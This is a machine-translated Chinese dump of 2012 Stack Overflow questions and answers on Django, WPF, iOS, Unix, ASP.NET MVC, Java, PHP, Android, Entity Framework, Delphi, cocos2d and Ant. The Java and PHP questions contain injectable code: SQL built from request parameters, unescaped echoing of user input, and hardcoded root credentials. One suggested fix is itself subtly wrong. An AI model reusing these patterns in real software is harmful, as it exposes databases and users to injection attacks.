       <li> {{ x.type }}: {{ x.email }} {% if x.primary == "True" %} (Primary) {% endif %} </li>
    {% endif %}
{% endfor %}
</ul> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T19:42:45.097

不要引用`True`。只是`True`：

```
{% if x.primary == True %} 
```

或者更简单地说：

```
{% if x.primary %} 
```

# c# - C# wpf 保存“文件”、设置、状态

> ID：10658777
> 
> 赞同：0
> 
> 时间：2012-05-18T19:41:21.960
> 
> 标签：c#, wpf, state

我正在尝试了解如何在我的应用程序中保存状态和设置。

举个简单的例子，假设我有一个应用程序，我将图像从资源管理器拖到画布上。如果我想取回这些信息，最好的保存方法是什么？

我必须保存 -> 图像路径，以及它在画布上的位置。

因此，非常简单的解决方案是创建并保存一个文本文件，其中包含图像路径、Canvas.GetTop 和 Canvas.GetLeft 的值。

```
"C:\\users\\<username\\pic1.png", 100, 150
"C:\\users\\<username\\pic2.png", 300, 400 
```

然后在我想要的时候加载它们。

什么是更好的解决方案，一般来说这是如何完成的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:49:26.590

在 OnClosing(...) 事件期间获取 .Left 和东西。只需将其保存到 XML 文件并在公共 MainWindow() 中，只需读取 XML 文件并加载设置

# iphone - 在 NSUserdefault 的数组中添加一个项目

> ID：10658782
> 
> 赞同：0
> 
> 时间：2012-05-18T19:41:48.853
> 
> 标签：iphone, objective-c, ios, xcode, nsuserdefaults

我是 iOS 开发新手，找不到解决此问题的方法：

我有一个应用程序，它有两个视图：一个是用户输入一些信息（比如一个字符串）的视图，另一个是一个包含所有曾经输入过的字符串的 tableview 视图（比如历史视图）。

我试图找到的是一种存储输入字符串的好方法，然后在用户切换到历史记录后将其加载到表视图数据源中。我尝试使用 NSUserdefault 但没有多大成功。只是弄乱了数据结构等。

这是我在主视图上所做的（用户输入输入字符串的地方）：

```
 NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];     
    NSMutableArray *arr1 = [[NSMutableArray alloc] init];
    arr1 = [defaults arrayForKey:@"historyNames"];

    [arr1 addObject:string];

    [defaults setObject:arr1 forKey:@"historyNames"]; 
```

出于某种原因，我在阅读 arr1 时收到了警告，老实说，我怀疑这是否应该起作用。

谁能建议我如何修改它以使其正常工作并实现我正在寻找的东西？

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-18T19:58:41.253

```
[defaults arrayForKey:@"historyNames"]; 
```

如果您从未在 NSUSerDefaults 中为该键初始化和保存数组，则将返回 nil。

如果您初始化和数组并设置一次（查看如何初始化 NSUserDefaults 的默认值），它将返回一个正确的数组。

然后你可以做

```
NSMutableArray *arr1  = [NSMutableArray arrayWithArray:[[defaults arrayForKey@"historyNames"]]; 
```

根据这个数组有多少元素，你最好使用 Core Data。对于许多/较大的值，使用用户默认值不是很有效，只是对于小设置和类似的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:53:43.867

当您的应用程序启动时，查看用户默认值以查看您上次使用时是否已有数组对象。如果没有，请为 arr1 调用 alloc 和 init。（如果您从默认值访问它，您不想调用它。）

```
NSMutableArray * arr1;
arr1 = (NSMutableArray *) [defaults objectForKey:@"historyNames"];
if (!arr1) {
    arr1 = [[NSMutableArray alloc] initWithCapacity:20];
} 
```

在您的主视图中，只需添加输入字符串，并保存默认值。

```
NSUserDefaults *prefs = [NSUserDefaults standardUserDefaults];
[prefs setObject: arr1 forKey: @"historyNames"];
[prefs synchronize]; 
```

# unix - 删除unix文件的问题

> ID：10658783
> 
> 赞同：1
> 
> 时间：2012-05-18T19:41:50.040
> 
> 标签：unix

有人可以帮我解决这个问题：

如下所示，我有一个与“sp”同名的文件和目录

如何删除大小为 44673Bytes 的文件“sp”

```
opxnyd@opxzone1d:/opt/opxnyd/packages/OPXPNY3DB/src/OPXPNYP>ls -alrt 
-rwxr-xr-x   1 opxnyd   opics      44673 Sep  7  2011 sp
drwxr-xr-x   4 opxnyd   opics       1974 May 10 10:22 sp 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:44:13.283

诀窍是它们实际上没有相同的名称。其中之一的名称中有空白或非打印字符。试试看`ls --escape`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:51:28.390

尝试重命名文件（然后是其中任何一个）删除您不想要的文件（如果您想重命名文件夹，请再次重命名）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:44:19.057

您不能有同名的目录和文件。其中一个可能有一个空格或其他一些不可打印的字符。

举个例子：

```
$ touch "sp"
$ mkdir "sp "
$ ls -lrt
total 2
-rw-r--r--  1 user  staff    0 May 18 15:47 sp
drwxr-xr-x  2 user  staff   68 May 18 15:47 sp 
```

### 要仅删除文件，您可以使用以下 find 命令：

```
find -E . -depth 1 -type f -regex "\./sp[ \t]*" -exec rm {} \; 
```

或以下 rm 命令：

```
\rm -i sp\ * 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-18T19:48:17.217

正如查理马丁所说，他们实际上并没有同名。但是您可以不使用`rm sp*`-r 选项（目录），只删除文件。

# c# - 在我的 asp.net mvc 2 应用程序中，为什么有时会丢失通过 RedirectToAction 传递的参数？

> ID：10658787
> 
> 赞同：2
> 
> 时间：2012-05-18T19:42:03.083
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-2, redirecttoaction

在我的 asp.net mvc 2 应用程序中，为什么有时会丢失通过 RedirectToAction 传递的参数？

这让我很困惑。有时使用 RedirectToAction 有效，有时则无效。我没有找到任何押韵或理由。这是一个例子：

```
 return RedirectToAction("ExportReport",
            new { FieldOrder = fieldOrder }); 
```

我也试过这个变种：

```
 return RedirectToAction("ExportReport", "SearchAndExport",
            new { FieldOrder = fieldOrder }); 
```

我在 global.asax.cs 中添加了以下内容：

```
 routes.MapRoute(
            "ExportReport",
            "{controller}.aspx/{action}/{FieldOrder}",
            new { controller = "SearchAndExport", action = "ExportReport", FieldOrder = UrlParameter.Optional }
          ); 
```

最后，我要重定向到的操作的原型：

```
public FileContentResult ExportReport(List<String> FieldOrder) 
```

FieldOrder 的数据永远不会进入重定向操作。为什么？我知道我已经这样做了，并且它也工作了很多次。是什么赋予了？

**编辑 1**

为了清楚起见，FieldOrder 是一个`List<String>`. 我没有使用站点区域。重定向本身有效，但数据不会传递给方法。我已经验证了应该通过调试传递的数据。

另外，我宁愿不使用 TempData。如果您有多个动作重定向到另一个更通用的动作，那将变得混乱。仅通过参数传递数据更清洁（恕我直言）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T16:43:02.427

在这里回顾我的一些老问题......

这些重定向值丢失的原因是我将一个复杂的对象作为参数传递。ASP.NET MVC 2 没有处理这些。带有原始类型参数的重定向可以正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T21:31:56.353

将您的数据存储`FieldOrder`在 TempData（仅保存一个重定向的数据）[http://msdn.microsoft.com/en-us/library/system.web.mvc.tempdatadictionary.aspx](http://msdn.microsoft.com/en-us/library/system.web.mvc.tempdatadictionary.aspx)

# java - 用 Java 更新 MySQL 表

> ID：10658788
> 
> 赞同：2
> 
> 时间：2012-05-18T19:42:06.843
> 
> 标签：java, mysql, html, jsp

我正在尝试更新汽车的价格，但我只能更新数据库中的一项。我认为我的逻辑是错误的。

有人可以建议我如何解决它。

MySQL 表：

```
 +-----------+-----------+
 | car       | price     |
 +-----------+-----------+
 | Bmw       |    434312 |
 | Audi      |    222121 |
 | Mercedes  |     33333 |
 +-----------+-----------+ 
```

HTML 代码：

```
 <td><input TYPE="text" NAME="Bmw"></td>

                       <td><input TYPE="text" NAME="Audi"></td>

                       <td><input TYPE="text" NAME="Mercedes"></td> 
```

Java 代码：

```
 String Bmw=(String)session.getAttribute("Bmw");
    session.setAttribute("Bmw",Bmw);
    Bmw=request.getParameter("Bmw");

 String Audi=(String)session.getAttribute("Audi");
    session.setAttribute("Audi",Audi);
    Audi=request.getParameter("Audi");

 String Mercedes=(String)session.getAttribute("Mercedes");
    session.setAttribute("Mercedes",Mercedes);
    Mercedes=request.getParameter("Mercedes");

 try {
    Connection conn = null;
    Class.forName("com.mysql.jdbc.Driver").newInstance();
    conn =       DriverManager.getConnection("jdbc:mysql://localhost:3306/test","root","root");
    Statement st = null;
    session.setAttribute("st",st);
    st = conn.createStatement();
    String sqlqueryCommand = "select * from item";
    ResultSet results = st.executeQuery(sqlqueryCommand);

    while(results.next()) {
            if(request.getParameter("Bmw")!=null &&    results.getString("car").equals("Bmw")) {
                    st.executeUpdate("update item set price='"+Bmw+"' where   car='"+results.getString("car")+"'");
                    conn.commit();
            }
            if(request.getParameter("Audi")!=null && results.getString("car").equals("Audi")) {
                    st.executeUpdate("update item set price='"+Audi+"' where car='"+results.getString("car")+"'");
                    conn.commit();
            }
            if(request.getParameter("Mercedes")!=null && results.getString("car").equals("Mercedes")) {
             st.executeUpdate("update item set price='"+Mercedes+"' where car='"+results.getString("car")+"'");
             conn.commit();
             }  
    }
    conn.close();
}
catch(Exception e) {
    System.out.println(e);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T21:15:25.340

遍历结果时要小心。您在阅读表格时正在更新表格。

您不需要 Select 查询，因为您已经拥有数据库元数据。

```
results.getString("car").equals("Bmw") 
```

使这条线无用

```
where   car='"+results.getString("car")+"'" 
```

这两个语句都应该替换为一个简单的 Where 语句：

```
where car='Bmw' 
```

如果您对汽车类型进行了一次硬编码并且应该一直使用它。这仅允许您执行更新。有疑问后请查看结果集的状态`con.commit()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:56:21.893

你需要选择什么？你提前知道那个结果。

这部分：

> String Bmw=(String)session.getAttribute("Bmw"); session.setAttribute("Bmw",Bmw);

没有太多意义。也许您不想从会话中检索值，而是从请求中检索？

当心 sql 注入。请改用准备好的语句和参数占位符。

这是一个关于如何让事情变得更短、更安全的建议。这是关于 jdbc 如何工作的记忆，untestet。

```
String[] types = new String[]{"Bmw", "Audi", "Mercedes"};
PreparedStatement statement = conn.prepareStatement("update item set price=:price where car=:car");
for(String type : types)
{
  String parameterValue = request.getParameter(type);
  if (type != null)
  {
    statement.setObject("price", parameterValue);
    statement.setObject("car", type);
    statement.executeUpdate();
  }
}
statement.close(); 
```

此外，在您的 catch 块中，您可能希望使用`e.printStackTrace()`而不是`System.out.println(e);`，这在调试时会更有帮助。

PS：您确定您的汽车列项目不包含任何空格吗？`results.getString("car")`在任何循环上打印您的。

# php - PHP搜索页面问题

> ID：10658789
> 
> 赞同：0
> 
> 时间：2012-05-18T19:42:15.000
> 
> 标签：php, mysql, search

我已经用 PHP 为搜索页面编写了这段代码，我想知道一种使搜索结果更准确的方法。一些搜索字符串会提取数据库中的所有内容，因为它包含该词。这是我的代码

```
<?php include("header.php");?>
<h3>Rental Search Results</h3>
<div class="searchbox">
<form method="get" action="<?php echo $_SERVER['PHP_SELF']; ?>">
<label for="usersearch">Search Rentals Now:</label>
<input type="text" name="usersearch" value="<?php echo $_GET['usersearch']; ?>" />
<input type="submit" name="submit" value="Search" />
</form>
</div>
<br />
<br />
<?php

  // This function builds a search query from the search keywords and sort setting
  function build_query($user_search, $sort) {
    $search_query = "SELECT * FROM online_rental_db";

    // Extract the search keywords into an array
    $clean_search = str_replace(',', ' ', $user_search);
    $search_words = explode(' ', $clean_search);
    $final_search_words = array();
    if (count($search_words) > 0) {
      foreach ($search_words as $word) {
        if (!empty($word)) {
          $final_search_words[] = $word;
        }
      }
    }

    // Generate a WHERE clause using all of the search keywords
    $where_list = array();
    if (count($final_search_words) > 0) {
      foreach($final_search_words as $word) {
        $where_list[] = "Description LIKE '%$word%' OR Manufacturer LIKE '%$word%' OR Model LIKE '%$word%' OR Category LIKE '%$word%'";
      }
    }
    $where_clause = implode(' OR ', $where_list);

    // Add the keyword WHERE clause to the search query
    if (!empty($where_clause)) {
      $search_query .= " WHERE $where_clause";
    }

    // Sort the search query using the sort setting
    switch ($sort) {
    // Ascending by job title
    case 1:
      $search_query .= " ORDER BY Description";
      break;
    // Descending by job title
    case 2:
      $search_query .= " ORDER BY Description DESC";
      break;
    // Ascending by state
    case 3:
      $search_query .= " ORDER BY Manufacturer";
      break;
    // Descending by state
    case 4:
      $search_query .= " ORDER BY Manufacturer DESC";
      break;
    // Ascending by date posted (oldest first)
    case 5:
      $search_query .= " ORDER BY Model";
      break;
    // Descending by date posted (newest first)
    case 6:
      $search_query .= " ORDER BY Model DESC";
      break;
    default:
      // No sort setting provided, so don't sort the query
    }

    return $search_query;
  }

  // This function builds navigational page links based on the current page and the number of pages
  function generate_page_links($user_search, $sort, $cur_page, $num_pages) {
    $page_links = '';

    // If this page is not the first page, generate the "previous" link
    if ($cur_page > 1) {

      $page_links .= '<a href="' . $_SERVER['PHP_SELF'] . '?usersearch=' . $user_search . '&sort=' . $sort . '&page=' . ($cur_page - 1) . '"><-</a> ';
    }
    else {
      $page_links .= '<- ';
    }

    // Loop through the pages generating the page number links
    for ($i = 1; $i <= $num_pages; $i++) {
      if ($cur_page == $i) {
        $page_links .= ' ' . $i;
      }
      else {
        $page_links .= ' <a href="' . $_SERVER['PHP_SELF'] . '?usersearch=' . $user_search . '&sort=' . $sort . '&page=' . $i . '"> ' . $i . '</a>';
      }
    }

    // If this page is not the last page, generate the "next" link
    if ($cur_page < $num_pages) {
      $page_links .= ' <a href="' . $_SERVER['PHP_SELF'] . '?usersearch=' . $user_search . '&sort=' . $sort . '&page=' . ($cur_page + 1) . '">-></a>';
    }
    else {
      $page_links .= ' ->';
    }

    return $page_links;
  }

  // Grab the sort setting and search keywords from the URL using GET
  $user_search = $_GET['usersearch'];

  // Calculate pagination information
  $cur_page = isset($_GET['page']) ? $_GET['page'] : 1;
  $results_per_page = 5;  // number of results per page
  $skip = (($cur_page - 1) * $results_per_page);

  // Start generating the table of results
  echo '<table class="results">';
  echo '<td align="center">Description</td><td align="center">Manufacturer</td><td align="center">Model #</td><td align="center">Image</td>';

  // Generate the search result headings
  echo '<tr class="bottomborder">';
  echo '</tr>';

  // Connect to the database
  require_once('connectvars.php');
  $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);

  // Query to get the total results 
  $query = build_query($user_search,'');
  $result = mysqli_query($dbc, $query);
  $total = mysqli_num_rows($result);
  $num_pages = ceil($total / $results_per_page);

  // Query again to get just the subset of results
  $query =  $query . " LIMIT $skip, $results_per_page";
  $result = mysqli_query($dbc, $query);
  while ($row = mysqli_fetch_array($result)) {
      $description = $row['Description'];
      $model = $row['Model'];
      $manufacturer = $row['Manufacturer'];
      $image = $row['Image'];
      $hour = $row['Hour'];
      $day = $row['Day'];
      $week = $row['Week'];
      $month = $row['Month'];
      $file = $row['PDF'];
      $ID = $row['ID'];
      $Category = $row['Category'];
      $CTGID = $row['CTGID'];
      if ($image == "") {
          $image = "No Image";
      }else {
          $image = "<a class=\"thumbnail\" href=\"pp.php?ID=$ID\"><img class=\"rental_image\" src=\"$image\"><span><img src=\"$image\" ><br> $description</span></a>";
      }
    echo '<tr>';
    echo "<td align=\"center\" valign=\"middle\" width=\"25%\"><a href=\"pp.php?ID=$ID\" alt=\"$description\">$description</a></td>";
    echo "<td align=\"center\" valign=\"middle\" width=\"25%\"><a href=\"pp.php?ID=$ID\">$manufacturer</a></td>";
    echo "<td align=\"center\" valign=\"middle\" width=\"25%\"><a href=\"pp.php?ID=$ID\">$model</a></td>";
    echo "<td align=\"center\" valign=\"middle\" width=\"25%\">$image</td>";
    echo '</tr>';

  } 
  echo '</table>';

  // Generate navigational page links if we have more than one page
  if ($num_pages > 1) {
    echo generate_page_links($user_search, '', $cur_page, $num_pages);
  } 
  mysqli_close($dbc);
?>
<?php include("footer.php");?>
</div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:46:45.570

我会使用[全文索引来匹配](http://dev.mysql.com/doc/refman/5.0/en/fulltext-search.html).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T20:55:20.373

Kindly use the AND not OR. Example

Searching 4 word: Hello, How, are, you

With OR it looks like: like '%Hello%' or .. like '%How%' or .. like '%are%' or ... '%you%'

Now want would happen in a row any of the four words found it is selected and displayed.

With AND it looks like: like '%Hello%' and .. like '%How%' and .. like '%are%' and ... '%you%'

Now only the row which has the four words would be only selected.

Your can also say that in any row as Apples or Oranges would be selected, In AND Apples and Oranges means only having both things is required.

# android - 应用程序在后台运行时如何在android中捕获屏幕？

> ID：10658795
> 
> 赞同：1
> 
> 时间：2012-05-18T19:42:48.013
> 
> 标签：android

我正在使用此代码来捕获屏幕，但是当应用程序在后台运行时，它只捕获活动而不捕获屏幕。

```
Bitmap bitmap;
View v1 = MyView.getRootView();
v1.setDrawingCacheEnabled(true);
bitmap = Bitmap.createBitmap(v1.getDrawingCache());
v1.setDrawingCacheEnabled(false); 
```

任何人都可以提出捕获屏幕代码，它可以捕获屏幕中的任何内容。

# entity-framework - EF Code-First缓存坏表名？

> ID：10658796
> 
> 赞同：0
> 
> 时间：2012-05-18T19:42:51.530
> 
> 标签：entity-framework, ef-code-first, code-first

我有一个使用代码优先实体框架 4.3.1 的控制台应用程序。我创建了一个类、一个 DbContext、一个 DbSet，并且我有一个数据库连接。

问题是我拼错了表名并且程序抛出了错误。我更改了 DbSet 中的名称，系统不断抛出与旧名称相同的错误。

例子：

```
public DbSet<SHIPPER> SHIPPERs { get; set; } 
```

这在 SQL 服务器中找不到 SHIPPERs 表。没问题。我把它改成

```
public DbSet<SHIPPER> SHIPPER { get; set; } 
```

我得到**无效的对象名称'dbo.SHIPPERs'。”**

我在 Visual Studio 中搜索了 SHIPPER，但没有返回任何内容。我错过了什么？

注意：我为不同的表创建了另一个 DbSet，并且可以正常工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T20:53:09.533

问题在于多元化。在 DbContext 类中添加以下代码以解决此问题：

```
 protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        modelBuilder.Conventions.Remove<PluralizingTableNameConvention>();
    } 
```

# delphi - 在 Delphi 中使用 ADO 连接连接到 SQL Compact 文件 (.sdf)

> ID：10658799
> 
> 赞同：2
> 
> 时间：2012-05-18T19:43:15.530
> 
> 标签：delphi, sql-server-ce

如果主数据库无法访问，我正在尝试使用本地 .sdf 文件作为临时存储的手段。我有 .sdf 文件，但是当我尝试将其设置为文件时，它似乎根本不知道 .sdf 是否存在。我目前拥有的当前连接字符串是：

```
 Driver={SQL Native Client};Data Source=C::\users\username\desktop\file\MyData.sdf;Persist Security Info=False 
```

对于它为我生成的提供者：

```
 Provider=Microsoft.SQLSERVER.CE.OLEDB.3.5 
```

当我尝试使用连接时，我得到一个“找不到提供程序。它可能没有正确安装。” .sdf 绝对在文件夹中。我也有/遇到过需要用户名和/或密码的问题，在创建数据库时我都不必指定。

问题：我的连接字符串有问题吗？使用 ADO 连接访问 SQL Compact 数据库是否合理？是否有一种更简单的方法可以从临时存储中查询/检索数据（不过我更喜欢用 SQL 来做）？大多数文档似乎来自 2003/2005，这没有帮助。

我使用“connectionstrings.com”来帮助制作字符串。任何建议都会有所帮助，谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-19T03:38:39.770

首先要打开 sdf 文件，您必须使用与 sdf 文件版本兼容的提供程序。由于您在评论中提到了 3.5 版，因此您必须使用此提供程序`Microsoft.SQLSERVER.CE.OLEDB.3.5`

然后您必须确保安装了哪个提供程序

尝试使用此代码列出系统中安装的 OLEDB 提供程序

```
{$APPTYPE CONSOLE}

{$R *.res}

uses
  Windows,
  Registry,
  Classes,
  SysUtils;

procedure ListOLEDBProviders;
var
  LRegistry: TRegistry;
  LIndex: Integer;
  SubKeys,Values: TStrings;
  CurKey, CurSubKey: string;
begin
  LRegistry := TRegistry.Create;
  try
    LRegistry.RootKey := HKEY_CLASSES_ROOT;
    if LRegistry.OpenKeyReadOnly('CLSID') then
    begin
      SubKeys := TStringList.Create;
      try
        LRegistry.GetKeyNames(SubKeys);
        LRegistry.CloseKey;
        for LIndex := 0 to SubKeys.Count - 1 do
        begin
          CurKey := 'CLSID\' + SubKeys[LIndex];
          if LRegistry.KeyExists(CurKey)  then
          begin
            if LRegistry.OpenKeyReadOnly(CurKey) then
            begin
              Values:=TStringList.Create;
              try
                LRegistry.GetValueNames(Values);
                LRegistry.CloseKey;
                for CurSubKey in Values do
                 if SameText(CurSubKey, 'OLEDB_SERVICES') then
                   if LRegistry.OpenKeyReadOnly(CurKey+'\ProgID') then
                   begin
                     Writeln(LRegistry.ReadString(''));
                     LRegistry.CloseKey;
                     if LRegistry.OpenKeyReadOnly(CurKey+'\OLE DB Provider') then
                     begin
                      Writeln('    '+LRegistry.ReadString(''));
                      LRegistry.CloseKey;
                     end;
                   end;
              finally
                Values.Free;
              end;
            end;
          end;
        end;
      finally
        SubKeys.Free;
      end;
      LRegistry.CloseKey;
    end;
  finally
    LRegistry.Free;
  end;
end;

begin
 try
    ListOLEDBProviders;
 except
    on E:Exception do
        Writeln(E.Classname, ':', E.Message);
 end;
 Writeln('Press Enter to exit');
 Readln;
end. 
```

现在这是连接到 Sql Server 压缩文件的基本示例。

```
{$APPTYPE CONSOLE}

{$R *.res}

uses
  ActiveX,
  ComObj,
  AdoDb,
  SysUtils;

procedure Test;
Var
  AdoQuery : TADOQuery;
begin
  AdoQuery:=TADOQuery.Create(nil);
  try
    AdoQuery.ConnectionString:='Provider=Microsoft.SQLSERVER.CE.OLEDB.3.5;Data Source=C:\Datos\Northwind.sdf';
    AdoQuery.SQL.Text:='Select * from Customers';
    AdoQuery.Open;
    While not AdoQuery.eof do
    begin
      Writeln(Format('%s %s',[AdoQuery.FieldByName('Customer ID').AsString,AdoQuery.FieldByName('Company Name').AsString]));
      AdoQuery.Next;
    end;
  finally
    AdoQuery.Free;
  end;
end;

begin
 try
    CoInitialize(nil);
    try
      Test;
    finally
      CoUninitialize;
    end;
 except
    on E:EOleException do
        Writeln(Format('EOleException %s %x', [E.Message,E.ErrorCode]));
    on E:Exception do
        Writeln(E.Classname, ':', E.Message);
 end;
 Writeln('Press Enter to exit');
 Readln;
end. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-29T18:24:04.790

还检查**[这](http://technet.microsoft.com/en-us/library/aa257373%28v=sql.80%29.aspx)**有助于受保护的数据库

> “提供者=Microsoft.SQLSERVER.OLEDB.CE.2.0；数据源=\NorthWind.sdf；SSCE:数据库密码=”

# android - 在android中执行sql查询的方式有什么不同？

> ID：10658800
> 
> 赞同：3
> 
> 时间：2012-05-18T19:43:21.710
> 
> 标签：android, sqlite, android-activity, android-context

android 中的 db.execSQL() 方法和 activityObject.managedQuery() 方法有什么区别？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T19:53:21.197

`managedQuery(...)`是一种通用查询机制，可用于具有`ContentProviders`. 这可以包括 SQLite 数据库、电话联系人等。它只能用于“查询”数据而不能对数据库进行更改。

`db.execSQL(...)`是直接在 SQLite 数据库上的方法调用，可用于执行任何 SQL 操作。这意味着它不仅可以“查询”（SELECT）数据，还可以用于创建、更改、删​​除表以及插入、删除行等。

# iphone - 如何让精灵跟随轨迹？

> ID：10658801
> 
> 赞同：1
> 
> 时间：2012-05-18T19:43:31.690
> 
> 标签：iphone, ios, cocos2d-iphone, touches, trail

我正在制作一个游戏，玩家画一条线，然后一个精灵应该跟随并在其上运行。我有一个可变数组和一个效果很好的绘制方法。但我无法找到移动精灵的方法。我尝试了不同的方法，但我无法让迭代器工作。

它应该通过遍历数组来工作。其中填充了先前存储的 CGPoint 位置。我尝试在 ccTouchedEnded 中移动精灵，但它突出显示 [toucharray objectAtIndex:0] 并说“将'id'传递给不兼容类型'CGPoint（又名'struct CGPoint'）的参数”

```
 -(void) ccTouchesBegan:(NSSet *)touches withEvent:(UIEvent *)event  { 
    //remove objects each time the player makes a new path
    [toucharray removeAllObjects];
}

-(void) ccTouchesMoved:(NSSet *)touches withEvent:(UIEvent *)event  {    
    UITouch *touch = [ touches anyObject];
    CGPoint new_location = [touch locationInView: [touch view]];
    new_location = [[CCDirector sharedDirector] convertToGL:new_location];

    CGPoint oldTouchLocation = [touch previousLocationInView:touch.view];
    oldTouchLocation = [[CCDirector sharedDirector] convertToGL:oldTouchLocation];
    oldTouchLocation = [self convertToNodeSpace:oldTouchLocation];

    // add touches to the touch array 
   [toucharray addObject:NSStringFromCGPoint(new_location)];
    [toucharray addObject:NSStringFromCGPoint(oldTouchLocation)];

}

-(void)draw
{
    glEnable(GL_LINE_SMOOTH);

    for(int i = 0; i < [toucharray count]; i+=2)
    {
        CGPoint start = CGPointFromString([toucharray objectAtIndex:i]);
        CGPoint end = CGPointFromString([toucharray objectAtIndex:i+1]);
        ccDrawLine(start, end);
    }
}

-(void) ccTouchesEnded:(NSSet *)touches withEvent:(UIEvent *)event{

  // here is the line I can't get to work to move the sprite

 _sprite.position = ccpAdd(ccpMult([toucharray objectAtIndex:0], progress),         ccpMult([toucharray objectAtIndex:0+1], 1-progress));

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-23T05:22:16.113

I did this before, by (what you have so far) creating an array Mine was with multiple sprites on screen, so I also had 1 definition "Touched sprite"

ontouchstart empty array and add first point (start point) + set TouchedSprite to the Sprite that was closest to the start point) ontouchmove add point to array ontouchend (run the array on the sprite by actions (get back to that later)

A few problems is what I got, (1) I could only control 1 sprite at a time and (2) the drawn line had way too many points.

Solution to number 1: Create a subclass Object of a sprite and create your sprites like that. Within that object create an array (make it accessible with @property and @synthesize) which will allow you to place the drawn path points in. Also create a public method called "runPathAction". So onTouchStart you clean the Array and set the selected spriteObject. OnTouchMove add the items, OntouchEnd set the array of the selected spriteObject to the local array and then run the "runPathAction" method. (You could have passed it to the method, but I like doing it this way, just in case I want to access the array)

Solution to number 2: I found that drawing the line creates WAY to many points. So, i created a boolean operator called "CanDraw" and a schedule with a time interval of 0.1 (you can play around with it) to a method which sets canDraw to YES. and then in the onTouchMove you check for "canDraw == YES", add the point and set canDraw=NO;

This way you will have an interval of 0.1 seconds to add the points. Don't forget to remove the schedule onTouchEnd!!!

* * *

Now how to run the actions. You will want a steady speed, so you will need to set a speed variable. Walk through the array of points and calculate the distance between each point to create a total distance. (PS Don't forget that the first pint is from CurrentLocation to Point0 in the array) When you have the total distance you can figure out how much delay time you should set in your actions per step. (if you don't do this, you don't know the delay time and if you fix that you get weird movement).

Create a method, check the "count" of the array. If count = 0 return; (finished!!! do cleanup or whatever) otherwise run an actionsequence, which at the end calls itself. (the check for count will handle the "break". grab 1 item of the array CGPoint p = (objectAtIndex:0); and remove that item from the array (removeAtIndex:0). Run the action with the delay time and there you go!

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:53:16.097

将路径的位置记录在数组或列表中，并对其进行迭代以沿路径移动您的精灵。我在制作的游戏中这样做了，以在玩家身后创建粒子轨迹。我使用了一个大小为 20 的数组，并在一个区间内迭代，用我的角色位置更新迭代器位置的数组，然后将粒子效果移动到存储在数组中迭代器位置加 1 的位置。

您需要使用起始位置为数组播种，这样您就没有空值，并且当您位于数组末尾时，您需要一个特殊情况，因为您不想从越界位置，而是让您的代码从 0 位置读取。

# mysql - 如何连接到使用 ANT 创建的数据库

> ID：10658802
> 
> 赞同：0
> 
> 时间：2012-05-18T19:43:42.710
> 
> 标签：mysql, ant

我需要连接到 MySQL 5.5 中创建的“mydb”数据库。

我从[http://ant.apache.org/manual/Tasks/sql.html](http://ant.apache.org/manual/Tasks/sql.html)发现以下应该完成这项工作，但 ti 没有。

```
<sql
    driver="com.mysql.jdbc.Driver"
    url="jdbc:mysql://localhost:3306/broadleaf"
    userid="root"
    password="password">
</sql> 
```

然后在[另一篇文章](https://stackoverflow.com/questions/10653379/how-to-start-mysql-using-ant-task/10657485#10657485)中，以下可用于使用 ANT 启动和停止 MySQL：

```
<target name="start-db">
  <exec executable="C:\Program Files\MySQL\MySQL Server 5.5\bin\mysqld" osfamily="windows">
  </exec>

  <exec executable="mysql.server" osfamily="unix">
    <arg value="start"/>
  </exec>
</target>

<target name="stop-db">
  <exec executable="C:\Program Files\MySQL\MySQL Server 5.5\bin\mysqld" osfamily="windows">
    <arg value="-u"/>
    <arg value="root"/>
    <arg value="shutdown"/>
  </exec>

  <exec executable="mysql.server" osfamily="unix">
    <arg value="stop"/>
  </exec>
</target> 
```

有人能告诉我如何将这两个脚本粘合在一起以启动 MySQL 数据库，然后使用 ANT 脚本连接到特定数据库（例如 mydb）吗？同样停止数据库并断开与该数据库（mysql）的连接。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T20:49:41.357

您是否在问如何将所有内容整合到一个完整的 ANT 脚本中？

```
<project name="database-stuff" default="make-it-so">

    <target name="make-it-so" depends="start-db,run-sql,stop-db"/>

    <target name="start-db">
      <exec executable="C:\Program Files\MySQL\MySQL Server 5.5\bin\mysqld" osfamily="windows">
      </exec>

      <exec executable="mysql.server" osfamily="unix">
        <arg value="start"/>
      </exec>
    </target>

    <target name="stop-db">
      <exec executable="C:\Program Files\MySQL\MySQL Server 5.5\bin\mysqld" osfamily="windows">
        <arg value="-u"/>
        <arg value="root"/>
        <arg value="shutdown"/>
      </exec>

      <exec executable="mysql.server" osfamily="unix">
        <arg value="stop"/>
      </exec>
    </target>

    <target name="run-sql">
       <sql driver="com.mysql.jdbc.Driver"
            url="jdbc:mysql://localhost:3306/broadleaf"
            userid="root"
            password="password">

           -- SQL STATEMENTS GO HERE!!
       </sql>
    </target>

</project> 
```

如果不是，您将必须提供有关您遇到的错误类型的更多详细信息。

